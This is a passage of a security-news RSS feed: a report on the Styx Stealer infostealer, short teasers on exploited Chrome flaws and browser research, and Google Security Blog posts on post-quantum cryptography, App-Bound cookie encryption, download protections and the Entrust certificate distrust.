<link>https://www.cysecurity.news/2024/08/new-styx-stealer-malware-targets.html</link>
<guid>https://www.cysecurity.news/2024/08/new-styx-stealer-malware-targets.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div style="text-align: justify;"><div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2cs1e52c2zZX_kEEBVYJx6SW7nHbWCgvA_C3YS0RDLwZnV7CM6sViUxYQFMzQhH6Bt3M0winQRK0csAATRO1QA2kY25Xs4a6EIjcqnW32pt172h3gD1AiioGphJITok1gX0w_ZJEw_rVFVpQtntBg0mdHwNbenSq8RStUtFPBArUmwOrq8VPECnGnKoM/s1280/hacker-1944688_1280.jpg" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2cs1e52c2zZX_kEEBVYJx6SW7nHbWCgvA_C3YS0RDLwZnV7CM6sViUxYQFMzQhH6Bt3M0winQRK0csAATRO1QA2kY25Xs4a6EIjcqnW32pt172h3gD1AiioGphJITok1gX0w_ZJEw_rVFVpQtntBg0mdHwNbenSq8RStUtFPBArUmwOrq8VPECnGnKoM/s600/hacker-1944688_1280.jpg" width="600" /></a></div>A new malware strain known as Styx Stealer has recently emerged, posing a significant threat to online security. Discovered in April 2024, Styx Stealer primarily targets popular browsers based on the Chromium and Gecko engines, such as Chrome and Firefox. The malware is designed to pilfer a wide range of sensitive information from these browsers, including saved passwords, cookies, auto-fill data (which may include credit card details), cryptocurrency wallet information, system data like hardware specifics, external IP addresses, and even screenshots.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The implications of such a broad data theft capability are alarming, as the stolen information could be used for identity theft, financial fraud, or even more targeted cyberattacks.

Styx Stealer doesn’t stop at browsers. It also targets widely used instant messaging applications like Telegram and Discord. By compromising these platforms, the malware can gain access to users’ chats, potentially exposing sensitive conversations. This further exacerbates the threat, as the attackers could exploit this data to compromise the victim’s online identity or carry out social engineering attacks.

The origins of Styx Stealer trace back to a Turkish cybercriminal who operates under the alias “Sty1x.” The malware is sold through Telegram or a dedicated website, with prices ranging from $75 per month to $350 for unlimited access.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Interestingly, the malware’s discovery was aided by a critical mistake made by its developer. During the debugging process, the developer failed to implement proper operational security (OpSec) measures, inadvertently leaking sensitive data from their own computer to security researchers. This blunder not only exposed details about Styx Stealer’s capabilities and targets but also revealed the developer’s earnings and their connection to another notorious malware strain, Agent Tesla.

Further forensic analysis uncovered a link between Sty1x and a Nigerian threat actor known by aliases such as Fucosreal and Mack_Sant. This individual had previously been involved in a campaign using Agent Tesla malware to target Chinese firms in various sectors.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The connection between these two cybercriminals suggests potential collaboration, making Styx Stealer an even more formidable threat.

Styx Stealer appears to be a derivative of the Phemedrone Stealer malware, inheriting core functionalities while introducing enhancements like auto-start and crypto-clipping features. These improvements make Styx Stealer more dangerous, increasing its potential to cause significant financial harm to its victims.

The discovery of Styx Stealer highlights the ongoing evolution of cyber threats. Although the leak by the developer has likely disrupted Styx Stealer’s initial operations, it’s crucial to remain vigilant as cybercriminals adapt quickly.</div>
]]></content:encoded>
<pubDate>2024-08-25T11:03:46.174-04:00</pubDate>
</item>
<item>
<title>Google Warns of CVE-2024-7965 Chrome Security Flaw Under Active Exploitation</title>
<link>https://thehackernews.com/2024/08/google-warns-of-cve-2024-7965-chrome.html</link>
<guid>https://thehackernews.com/2024/08/google-warns-of-cve-2024-7965-chrome.html</guid>
<content:encoded><![CDATA[
Google has revealed that a security flaw that was patched as part of a software update rolled out last week to its Chrome browser has come under active exploitation in the wild.
Tracked as CVE-2024-7965, the vulnerability has been described as an inappropriate implementation bug in the V8 JavaScript and WebAssembly engine.
"Inappropriate implementation in V8 in Google Chrome prior to
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 10:15:00 +0530</pubDate>
</item>
<item>
<title>New Qilin Ransomware Attack Uses VPN Credentials, Steals Chrome Data</title>
<link>https://thehackernews.com/2024/08/new-qilin-ransomware-attack-uses-vpn.html</link>
<guid>https://thehackernews.com/2024/08/new-qilin-ransomware-attack-uses-vpn.html</guid>
<content:encoded><![CDATA[
The threat actors behind a recently observed Qilin ransomware attack have stolen credentials stored in Google Chrome browsers on a small set of compromised endpoints.
The use of credential harvesting in connection with a ransomware infection marks an unusual twist, and one that could have cascading consequences, cybersecurity firm Sophos said in a Thursday report.
The attack, detected in July
]]></content:encoded>
<pubDate>Fri, 23 Aug 2024 15:54:00 +0530</pubDate>
</item>
<item>
<title>Google Fixes High-Severity Chrome Flaw Actively Exploited in the Wild</title>
<link>https://thehackernews.com/2024/08/google-fixes-high-severity-chrome-flaw.html</link>
<guid>https://thehackernews.com/2024/08/google-fixes-high-severity-chrome-flaw.html</guid>
<content:encoded><![CDATA[
Google has rolled out security fixes to address a high-severity security flaw in its Chrome browser that it said has come under active exploitation in the wild.
Tracked as CVE-2024-7971, the vulnerability has been described as a type confusion bug in the V8 JavaScript and WebAssembly engine.
"Type confusion in V8 in Google Chrome prior to 128.0.6613.84 allowed a remote attacker to exploit heap
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 10:49:00 +0530</pubDate>
</item>
<item>
<title>Exploiting XSS in hidden inputs and meta tags</title>
<link>https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags</link>
<guid>https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags</guid>
<content:encoded><![CDATA[
In this post we are going to show how you can (ab)use the new HTML popup functionality in Chrome to exploit XSS in meta tags and hidden inputs. It all started when I noticed the new popover behaviour
]]></content:encoded>
<pubDate>Tue, 11 Jul 2023 13:00:00 GMT</pubDate>
</item>
<item>
<title>The curl quirk that exposed Burp Suite &amp;amp; Google Chrome</title>
<link>https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome</link>
<guid>https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome</guid>
<content:encoded><![CDATA[
In this post, we'll explore a little-known feature in curl that led to a local-file disclosure vulnerability in both Burp Suite Pro, and Google Chrome. We patched Burp Suite a while back, but suspect
]]></content:encoded>
<pubDate>Tue, 28 Mar 2023 13:13:51 GMT</pubDate>
</item>
<item>
<title>Using Hackability to uncover a Chrome infoleak</title>
<link>https://portswigger.net/research/using-hackability-to-uncover-a-chrome-infoleak</link>
<guid>https://portswigger.net/research/using-hackability-to-uncover-a-chrome-infoleak</guid>
<content:encoded><![CDATA[
I've been hacking browsers for over 15 years and one of the challenges I set myself was to find a SOP bypass or info leak in every major browser. Chrome was the last browser standing…until now. This p
]]></content:encoded>
<pubDate>Thu, 01 Sep 2022 13:00:00 GMT</pubDate>
</item>
<item>
<title>Framing without iframes</title>
<link>https://portswigger.net/research/framing-without-iframes</link>
<guid>https://portswigger.net/research/framing-without-iframes</guid>
<content:encoded><![CDATA[
Whilst testing for XSS vectors, we found some new ways of framing a web site that don't use the iframe element. Naturally, we've updated our XSS cheat sheet to document them. We discovered that Chrome
]]></content:encoded>
<pubDate>Wed, 27 Jul 2022 14:57:48 GMT</pubDate>
</item>
<item>
<title>Post-Quantum Cryptography: Standards and Progress</title>
<link>http://security.googleblog.com/2024/08/post-quantum-cryptography-standards.html</link>
<guid>http://security.googleblog.com/2024/08/post-quantum-cryptography-standards.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Royal Hansen, VP, Privacy, Safety and Security Engineering, Google, and Phil Venables, VP, TI Security & CISO, Google Cloud</span>

<p>
The National Institute of Standards and Technology (NIST) just released three finalized standards for post-quantum cryptography (PQC) covering public key encapsulation and two forms of digital signatures. In progress since 2016, this achievement represents a major milestone towards standards development that will keep information on the Internet secure and confidential for many years to come. 
</p>
<p>
Here's a brief overview of what PQC is, how Google is using PQC, and how other organizations can adopt these new standards. You can also read more about PQC and Google's role in the standardization process <a href="https://cloud.google.com/blog/products/identity-security/how-google-is-preparing-for-a-post-quantum-world/?e=48754805">in this 2022 post from Cloud CISO Phil Venables</a>.
</p>
<h2>What is PQC?</h2>


<p>
Encryption is central to keeping information confidential and secure on the Internet. Today, most Internet sessions in modern browsers are encrypted to prevent anyone from eavesdropping or altering the data in transit. Digital signatures are also crucial to online trust, from code signing proving that programs haven't been tampered with, to signals that can be relied on for confirming online identity.
</p>
<p>
Modern encryption technologies are secure because the computing power required to "crack the code" is very large; larger than any computer in existence today or the foreseeable future. Unfortunately, that's an advantage that won't last forever. Practical large-scale <a href="https://quantumai.google/discover/whatisqc">quantum computers</a> are still years away, but computer scientists <a href="https://en.wikipedia.org/wiki/Shor%27s_algorithm">have known for decades</a> that a cryptographically relevant quantum computer (CRQC) could break existing forms of asymmetric key cryptography.
</p>
<p>
PQC is the effort to defend against that risk, by defining standards and collaboratively implementing new algorithms that will resist attacks by both classical and quantum computers.
</p>
<p>
You don't need a quantum computer to use post-quantum cryptography, or to prepare. All of the standards released by NIST today run on the classical computers we currently use.
</p>
<h2>How is encryption at risk?</h2>


<p>
While a CRQC doesn't exist yet, devices and data from today will still be relevant in future. Some risks are already here:
</p>
<ul>

<li><strong>Stored Data</strong> Through an attack known as <em>Store Now, Decrypt Later</em>, encrypted data captured and saved by attackers is stored for later decryption, with the help of as-yet unbuilt quantum computers

<li><strong>Hardware Products</strong> Defenders must ensure that future attackers cannot forge a digital signature and implant compromised firmware, or software updates, on pre-quantum devices that are still in use
</li>
</ul>
<p>
For more information on CRQC-related risks, see our <a href="https://bughunters.google.com/blog/5108747984306176/google-s-threat-model-for-post-quantum-cryptography">PQC Threat Model post</a>.
</p>
<h2>How can organizations prepare for PQC migrations?</h2>


<p>
Migrating to new cryptographic algorithms is often a slow process, even when weaknesses affect widely-used crypto systems, because of organizational and logistical challenges in fully completing the transition to new technologies. For example, NIST deprecated SHA-1 hashing algorithms in 2011 and recommends complete phase-out by 2030.
</p>
<p>
That’s why it's crucial to take steps now to improve organizational preparedness, independent of PQC, with the goal of making your transition to PQC easier.
</p>
<p>
These <em>crypto agility</em> best practices can be enacted anytime:
</p>
<ul>

<li><strong>Cryptographic inventory</strong> Understanding where and how organizations are using cryptography includes knowing what cryptographic algorithms are in use, and critically, managing key material safely and securely 

<li><strong>Key rotation</strong> Any new cryptographic system will require the ability to generate new keys and move them to production without causing outages. Just like testing recovery from backups, regularly testing key rotation should be part of any good resilience plan

<li><strong>Abstraction layers</strong> You can use a tool like <a href="https://developers.google.com/tink">Tink, Google's multi-language, cross-platform open source library</a>, designed to make it easy for non-specialists to use cryptography safely, and to switch between cryptographic algorithms without extensive code refactoring

<li><strong>End-to-end testing</strong> PQC algorithms have different properties. Notably, public keys, ciphertexts, and signatures are significantly larger. Ensure that all layers of the stack function as expected
</li>
</ul>
<p>
Our <a href="https://www.nature.com/articles/s41586-022-04623-2">2022 paper "Transitioning organizations to post-quantum cryptography"</a> provides additional recommendations to help organizations prepare and this <a href="https://bughunters.google.com/blog/6182336647790592/cryptographic-agility-and-key-rotation">recent post from the Google Security Blog</a> has more detail on cryptographic agility and key rotation.
</p>
<h2>Google's PQC Commitments</h2>


<p>
Google takes these risks seriously, and is taking steps on multiple fronts. Google began <a href="https://security.googleblog.com/2016/07/experimenting-with-post-quantum.html">testing PQC in Chrome in 2016</a> and has been <a href="https://cloud.google.com/blog/products/identity-security/why-google-now-uses-post-quantum-cryptography-for-internal-comms?e=48754805">using PQC to protect internal communications</a> since 2022. In May 2024, <a href="https://blog.chromium.org/2024/05/advancing-our-amazing-bet-on-asymmetric.html">Chrome enabled ML-KEM by default</a> for TLS 1.3 and QUIC on desktop. ML-KEM is also enabled on Google servers. Connections between Chrome Desktop and Google's products, such as Cloud Console or Gmail, are already experimentally protected with post-quantum key exchange.
</p>
<p>
Google engineers have contributed to the standards released by NIST, as well as <a href="https://www.iso.org/standard/80492.html">standards created by ISO</a>, and have submitted Internet Drafts to the IETF for <a href="https://www.google.com/url?q=https://datatracker.ietf.org/doc/draft-davidben-tls-trust-expr/&amp;sa=D&amp;source=docs&amp;ust=1719337176044717&amp;usg=AOvVaw1GculUbK3_3Hgsv6w-VE-q">Trust Expressions</a>, <a href="https://www.google.com/url?q=https://datatracker.ietf.org/doc/draft-davidben-tls-merkle-tree-certs/&amp;sa=D&amp;source=docs&amp;ust=1719337176044781&amp;usg=AOvVaw1S2vxLo4QsJsIuaTIYmUy8">Merkle Tree Certificates</a>, and <a href="https://datatracker.ietf.org/doc/draft-wiggers-hbs-state/">managing state for hash-based signatures</a>. <a href="https://developers.google.com/tink">Tink</a>, Google's open source library that provides secure and easy-to-use cryptographic APIs, already provides experimental PQC algorithms in C++, and our engineers are working with partners to produce formally verified PQC implementations that can be used at Google, and beyond. 
</p>
<p>
As we make progress on our own PQC transition, Google will continue to provide PQC updates on Google services, with updates to come from Android, Chrome, Cloud, and others.
</p>
]]></content:encoded>
<pubDate>2024-08-13T10:00:07.223-04:00</pubDate>
</item>
<item>
<title>Improving the security of Chrome cookies on Windows</title>
<link>http://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html</link>
<guid>http://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Will Harris, Chrome Security Team</span>

<p>
Cybercriminals using cookie theft <a href="https://cloud.google.com/blog/products/identity-security/a-year-in-the-cybersecurity-trenches-with-mandiant-managed-defense">infostealer</a> malware continue to pose a risk to the safety and security of our users. We already have a number of initiatives in this area including <a href="https://security.googleblog.com/2024/07/building-security-into-redesigned.html">Chrome’s download protection</a> using Safe Browsing, <a href="https://blog.chromium.org/2024/04/fighting-cookie-theft-using-device.html">Device Bound Session Credentials</a>, and Google’s account-based threat detection to flag the use of stolen cookies. Today, we’re announcing another layer of protection to make Windows users safer from this type of malware.
</p>
<p>
Like other software that needs to store secrets, Chrome currently secures sensitive data like cookies and passwords using the strongest techniques the OS makes available to us - on macOS this is the <a href="https://developer.apple.com/documentation/security/keychain_services/">Keychain services</a>, and on Linux we use a system provided wallet such as kwallet or gnome-libsecret. On Windows, Chrome uses the Data Protection API (DPAPI) which protects the data at rest from other users on the system or cold boot attacks. However, the DPAPI does not protect against malicious applications able to execute code as the logged in user - which infostealers take advantage of.
</p>
<p>
In Chrome 127 we are introducing a new protection on Windows that improves on the DPAPI by providing <strong>Application-Bound (App-Bound) </strong>Encryption primitives. Rather than allowing any app running as the logged in user to access this data, Chrome can now encrypt data tied to app identity, similar to how the Keychain operates on macOS.
</p>
<p>
We will be migrating each type of secret to this new system starting with cookies in Chrome 127. In future releases we intend to expand this protection to passwords, payment data, and other persistent authentication tokens, further protecting users from infostealer malware.
</p>
<p>
<strong>How it works</strong>
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpjkAClX2VvgsIhLi2zAmvRwVMPEeJqUhqisKHIKxbfGAwh8p8-V7Ixct5azzn_jYfJYo2izWnGcbkVh3cabbCLVQQQsJAJagvFPCFJsx4MibauJqnLVymQYdhdGGc53q3wSJSeTPQ6vyxXosJ-tJRKuaaoV7_J_E2KB9glSZ1m3NSEwEBj-duevgROHlM/s1416/Screenshot%202024-07-26%202.15.06%20PM.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpjkAClX2VvgsIhLi2zAmvRwVMPEeJqUhqisKHIKxbfGAwh8p8-V7Ixct5azzn_jYfJYo2izWnGcbkVh3cabbCLVQQQsJAJagvFPCFJsx4MibauJqnLVymQYdhdGGc53q3wSJSeTPQ6vyxXosJ-tJRKuaaoV7_J_E2KB9glSZ1m3NSEwEBj-duevgROHlM/s16000/Screenshot%202024-07-26%202.15.06%20PM.png" /></a></div><p>
App-Bound Encryption relies on a privileged service to verify the identity of the requesting application. During encryption, the App-Bound Encryption service encodes the app's identity into the encrypted data, and then verifies this is valid when decryption is attempted. If another app on the system tries to decrypt the same data, it will fail.
</p>
<p>
Because the App-Bound service is running with system privileges, attackers need to do more than just coax a user into running a malicious app. Now, the malware has to gain system privileges, or inject code into Chrome, something that legitimate software shouldn't be doing. This makes their actions more suspicious to antivirus software – and more likely to be detected. Our other recent initiatives such as providing <a href="https://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html">event logs</a> for cookie decryption work in tandem with this protection, with the goal of further increasing the cost and risk of detection to attackers attempting to steal user data.
</p>
<p>
<strong>Enterprise Considerations</strong>
</p>
<p>
Since malware can bypass this protection by running elevated, enterprise environments that do not grant their users the ability to run downloaded files as Administrator are particularly helped by this protection - malware cannot simply request elevation privilege in these environments and is forced to use techniques such as injection that can be more easily detected by endpoint agents.
</p>
<p>
App-Bound Encryption strongly binds the encryption key to the machine, so will not function correctly in environments where Chrome profiles roam between multiple machines. We encourage enterprises who wish to support roaming profiles to follow current <a href="https://support.google.com/chrome/a/answer/7349337">best practices</a>. If it becomes necessary, App-Bound encryption can be configured using the new <a href="https://chromeenterprise.google/policies/#ApplicationBoundEncryptionEnabled">ApplicationBoundEncryptionEnabled</a> policy.
</p>
<p>
To further help detect any incompatibilities, Chrome emits an event when a failed verification occurs. The Event is ID 257 from 'Chrome' source in the Application log.
</p>
<p>
<strong>Conclusion</strong>
</p>
<p>
App-Bound Encryption increases the cost of data theft to attackers and also makes their actions far noisier on the system. It helps defenders draw a clear line in the sand for what is acceptable behavior for other apps on the system. As the malware landscape continually evolves we are keen to continue engaging with others in the security community on improving detections and strengthening operating system protections, such as stronger app isolation primitives, for any bypasses.
</p>
]]></content:encoded>
<pubDate>2024-07-30T13:02:03.926-04:00</pubDate>
</item>
<item>
<title>Building security into the redesigned Chrome downloads experience</title>
<link>http://security.googleblog.com/2024/07/building-security-into-redesigned.html</link>
<guid>http://security.googleblog.com/2024/07/building-security-into-redesigned.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Jasika Bawa, Lily Chen, and Daniel Rubery, Chrome Security</span>

<p>
Last year, we introduced a <a href="https://blog.chromium.org/2023/08/redesigning-chrome-downloads-to-keep.html">redesign</a> of the Chrome downloads experience on desktop to make it easier for users to interact with recent downloads. At the time, we mentioned that the additional space and more flexible UI of the new Chrome downloads experience would give us new opportunities to make sure users stay safe when downloading files. 
</p>
<p>
<strong>Adding context and consistency to download warnings</strong>
</p>
<p>
The redesigned Chrome downloads experience gives us the opportunity to provide even more context when Chrome protects a user from a <a href="https://support.google.com/chrome/answer/6261569">potentially malicious file</a>. Taking advantage of the additional space available in the new downloads UI, we have replaced our previous warning messages with more detailed ones that convey more nuance about the nature of the danger and can help users make more informed decisions.
</p>

<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gQhfi9Adg__U7OfrbECy8i7-lZIrptsdyyahf0H2Ky5geMifkcYWAxdmNifsoRZiXn4uN5Ybgq2ycO0ZGEmajqLYEjRb5fH52Mw9-swQCxJ5cv67zEt133yYJh651bS5YpUDG9LcAyC5PwG-ZvL1fO2tFXwS91Q5c9V20ms70V6DWe1TJamrZc-NmTid/s2000/RedesignedWarning_inline_7.10.24_V3.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gQhfi9Adg__U7OfrbECy8i7-lZIrptsdyyahf0H2Ky5geMifkcYWAxdmNifsoRZiXn4uN5Ybgq2ycO0ZGEmajqLYEjRb5fH52Mw9-swQCxJ5cv67zEt133yYJh651bS5YpUDG9LcAyC5PwG-ZvL1fO2tFXwS91Q5c9V20ms70V6DWe1TJamrZc-NmTid/s16000/RedesignedWarning_inline_7.10.24_V3.png" /></a></div><p style="text-align: center;">
<em>Our legacy, space-constrained warning vs. our redesigned one</em>
</p>
<p style="text-align: left;">
We also made download warnings more understandable by introducing a two-tier download warning taxonomy based on AI-powered malware verdicts from <a href="https://safebrowsing.google.com/">Google Safe Browsing</a>. These are: 
</p>
<ol>

<li>Suspicious files (lower confidence verdict, unknown risk of user harm)

</li><li>Dangerous files (high confidence verdict, high risk of user harm)
</li>
</ol>
<p>
These two tiers of warnings are distinguished by iconography, color, and text, to make it easy for users to quickly and confidently make the best choice for themselves based on the nature of the danger and Safe Browsing's level of certainty. Overall, these improvements in clarity and consistency have resulted in significant changes in user behavior, including fewer warnings bypassed, warnings heeded more quickly, and all in all, better protection from malicious downloads.
</p><p style="text-align: center;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPtYz0ba59W8_Orn_Q_viwJ_brTwqLTlZeGwUPAO0IRmuyKWSv4Fxr6Fb34UfBJzHAT0Ydok7JdnPb26t7GxRQD3whlixXbqzrfuFlKYs8DsuH1_Zd3QieU1-RyrGODIrWzJavG-PH0uBchqOFTT51Wgea8uLxTFD_2XHIBy3Vmw77nOmbOIbuqmNq4jOC/s1080/SuspiciousAndDangerous_inline_V2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPtYz0ba59W8_Orn_Q_viwJ_brTwqLTlZeGwUPAO0IRmuyKWSv4Fxr6Fb34UfBJzHAT0Ydok7JdnPb26t7GxRQD3whlixXbqzrfuFlKYs8DsuH1_Zd3QieU1-RyrGODIrWzJavG-PH0uBchqOFTT51Wgea8uLxTFD_2XHIBy3Vmw77nOmbOIbuqmNq4jOC/s16000/SuspiciousAndDangerous_inline_V2.png" /></a></div><p></p><p style="text-align: center;">
<em>Differentiation between suspicious and dangerous warnings</em>
</p>
<p style="text-align: left;">
<strong>Protecting more downloads with automatic deep scans</strong>
</p>
<p>
Users who have opted-in to the <a href="https://support.google.com/chrome/answer/9890866">Enhanced Protection</a> mode of Safe Browsing in Chrome are prompted to send the contents of suspicious files to Safe Browsing for deep scanning before opening the file. Suspicious files are a small fraction of overall downloads, and file contents are only scanned for security purposes and are deleted shortly after a verdict is returned.
</p>
<p>
We've found these additional scans to have been extraordinarily successful – they help catch brand new malware that Safe Browsing has not seen before and dangerous files hosted on brand new sites. In fact, <strong>files sent for deep scanning are over 50x more likely to be flagged as malware</strong> than downloads in the aggregate.
</p>
<p>
Since Enhanced Protection users have already agreed to send a small fraction of their downloads to Safe Browsing for security purposes in order to benefit from additional protections, we recently moved towards automatic deep scans for these users rather than prompting each time. This will protect users from risky downloads while reducing user friction.
</p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYi1YW6gCA9xGgTp67Z7QVvH6guYbAVN6HUl1XrOxAYHS308MtmpVddM83GMVWa8OUtctfL5HA0gMopBIgw8qNX3OXD6j_8HWKYyfzy0nwhFYxvhiJIsx3W251jg8Jnv2Wx4_X3WuNO5YNnJbxU52ru8maUatuULjEGYBNqR0fuJp181b9Gje9tllPDROo/s1080/Chrome_Auto-Scan-Block_Inline_V1.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYi1YW6gCA9xGgTp67Z7QVvH6guYbAVN6HUl1XrOxAYHS308MtmpVddM83GMVWa8OUtctfL5HA0gMopBIgw8qNX3OXD6j_8HWKYyfzy0nwhFYxvhiJIsx3W251jg8Jnv2Wx4_X3WuNO5YNnJbxU52ru8maUatuULjEGYBNqR0fuJp181b9Gje9tllPDROo/s16000/Chrome_Auto-Scan-Block_Inline_V1.gif" /></a></div><p></p><p style="text-align: center;">
<em>An automatic deep scan resulting in a warning</em>
</p>
<p style="text-align: left;">
<strong>Staying ahead of attackers who hide in encrypted archives</strong>
</p>
<p>
Not all deep scans can be conducted automatically. A current trend in <a href="https://blog.google/threat-analysis-group/phishing-campaign-targets-youtube-creators-cookie-theft-malware/">cookie theft</a> malware distribution is packaging malicious software in an encrypted archive – a .zip, .7z, or .rar file, protected by a password – which hides file contents from Safe Browsing and other antivirus detection scans. In order to combat this evasion technique, we have introduced two protection mechanisms depending on the mode of Safe Browsing selected by the user in Chrome.
</p>
<p>
Attackers often make the passwords to encrypted archives available in places like the page from which the file was downloaded, or in the download file name. For Enhanced Protection users, downloads of suspicious encrypted archives will now prompt the user to enter the file's password and send it along with the file to Safe Browsing so that the file can be opened and a deep scan may be performed. Uploaded files and file passwords are deleted a short time after they're scanned, and all collected data is only used by Safe Browsing to provide better download protections.
</p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeWn18o6NDzNv7ILTz4Hv-U-4kH-WUx8goTr_8HavUJIn_f3vW9DKGJYxd0rmElQdxeYFp6bPmHU3XJkGnZUToAsdkSE_i_xjv7d4CEzR-7crVH3z2jLtOynwIeJYXBbddPfas_-rfSS3R-sbAZkpR3zQyCAiBCpXB4xzc7CUuyPkDRPdlx8lCtAIa5m2_/s1080/FilePassword_inline_Option%2003%20(More%20cropped%20in).png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeWn18o6NDzNv7ILTz4Hv-U-4kH-WUx8goTr_8HavUJIn_f3vW9DKGJYxd0rmElQdxeYFp6bPmHU3XJkGnZUToAsdkSE_i_xjv7d4CEzR-7crVH3z2jLtOynwIeJYXBbddPfas_-rfSS3R-sbAZkpR3zQyCAiBCpXB4xzc7CUuyPkDRPdlx8lCtAIa5m2_/s16000/FilePassword_inline_Option%2003%20(More%20cropped%20in).png" /></a></div><p></p><p style="text-align: center;">
<em>Enter a file password to send an encrypted file for a malware scan</em>
</p>
<p style="text-align: left;">
For those who use Standard Protection mode which is the default in Chrome, we still wanted to be able to provide some level of protection. In Standard Protection mode, downloading a suspicious encrypted archive will also trigger a prompt to enter the file's password, but in this case, both the file and the password stay on the local device and only the metadata of the archive contents are checked with Safe Browsing. As such, in this mode, users are still protected as long as Safe Browsing had previously seen and categorized the malware.
</p>
<p>
The Chrome Security team works closely with Safe Browsing, Google's <a href="https://blog.google/threat-analysis-group/">Threat Analysis Group</a>, and security researchers from around the world to gain insights into the techniques attackers are using. Using these insights, we are constantly adapting our product strategy to stay ahead of attackers and to keep users safe while downloading files in Chrome. We look forward to sharing more in the future!
</p>
]]></content:encoded>
<pubDate>2024-07-24T12:01:36.224-04:00</pubDate>
</item>
<item>
<title>Sustaining Digital Certificate Security - Entrust Certificate Distrust</title>
<link>http://security.googleblog.com/2024/06/sustaining-digital-certificate-security.html</link>
<guid>http://security.googleblog.com/2024/06/sustaining-digital-certificate-security.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Chrome Root Program, Chrome Security Team</span>

<p>
<em><b>Update (07/22/2024): </b>Website operators who will be impacted by the upcoming change in Chrome for new TLS certificates issued after October 31, 2024 can explore continuity options offered by Entrust. Entrust has expressed its commitment to continuing to support customer needs, and is best positioned to describe the available options for website operators. Learn more at Entrust’s <a href="https://www.entrust.com/tls-certificate-information-center">TLS Certificate Information Center</a>.</em>
</p>

    

<p>
The Chrome Security Team prioritizes the security and privacy of Chrome’s users, and we are unwilling to compromise on these values.
</p>
<p>
The <a href="https://www.chromium.org/Home/chromium-security/root-ca-policy/">Chrome Root Program Policy</a> states that CA certificates included in the <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a> must provide value to Chrome end users that exceeds the risk of their continued inclusion. It also describes many of the <a href="https://www.chromium.org/Home/chromium-security/root-ca-policy/#7-reporting-and-responding-to-incidents">factors</a> we consider significant when CA Owners disclose and respond to incidents. When things don’t go right, we expect CA Owners to commit to meaningful and demonstrable change resulting in evidenced continuous improvement.  
</p>
<p>
Over the past several years, publicly disclosed <a href="https://bugzilla.mozilla.org/buglist.cgi?o2=greaterthaneq&amp;short_desc_type=casesubstring&amp;o1=notequals&amp;v1=Graveyard&amp;classification=Client%20Software&amp;classification=Developer%20Infrastructure&amp;classification=Components&amp;classification=Server%20Software&amp;classification=Other&amp;classification=Graveyard&amp;v2=2015-11-01&amp;f1=classification&amp;bug_status=UNCONFIRMED&amp;bug_status=NEW&amp;bug_status=ASSIGNED&amp;bug_status=REOPENED&amp;bug_status=RESOLVED&amp;bug_status=VERIFIED&amp;bug_status=CLOSED&amp;short_desc=Entrust&amp;f2=creation_ts&amp;component=CA%20Certificate%20Compliance&amp;query_format=advanced&amp;list_id=17064895">incident reports</a> highlighted a pattern of concerning behaviors by Entrust that fall short of the above expectations, and has eroded confidence in their competence, reliability, and integrity as a publicly-trusted CA Owner. 
</p>
<p>
In response to the above concerns and to preserve the integrity of the <a href="https://security.googleblog.com/2023/05/how-chrome-root-program-keeps-users-safe.html#:~:text=Chrome%20uses%20digital,the%20%E2%80%9CWeb%20PKI.%E2%80%9D">Web PKI</a> ecosystem, Chrome will take the following actions. 
</p>
<p>
<span style="text-decoration: underline;">Upcoming change in Chrome 127 and higher:</span>
</p>
<ul style="text-align: left;">

<li>TLS server authentication certificates validating to the following Entrust roots whose <em>earliest</em> Signed Certificate Timestamp (SCT) is dated <span style="text-decoration: underline;">after</span> <strong>October 31, 2024,</strong> will no longer be trusted by default. 
<ul>
 
<li><a href="https://crt.sh/?q=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5">CN=Entrust Root Certification Authority - EC1,OU=See www.entrust.net/legal-terms+OU=(c) 2012 Entrust, Inc. - for authorized use only,O=Entrust, Inc.,C=US</a> 
 
